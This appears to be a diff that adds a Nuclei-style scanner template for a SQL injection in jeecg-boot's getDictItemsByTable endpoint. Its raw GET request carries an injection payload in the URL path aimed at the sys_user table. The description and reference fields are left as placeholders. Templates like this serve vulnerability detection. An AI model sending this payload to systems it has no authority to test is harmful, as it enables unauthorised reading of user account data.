@@ -1,0 +1,33 @@
+id: jeecg-boot-getDictItemsByTable-sql
+
+info:
+  name: jeecg-boot getDictItemsByTable sql
+  author: proud
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: sql 
+
+http:
+  - raw:
+      - |+
+        GET /api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: keep-alive
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - 'application/json'
+      - type: status
+        status:
+          - 200
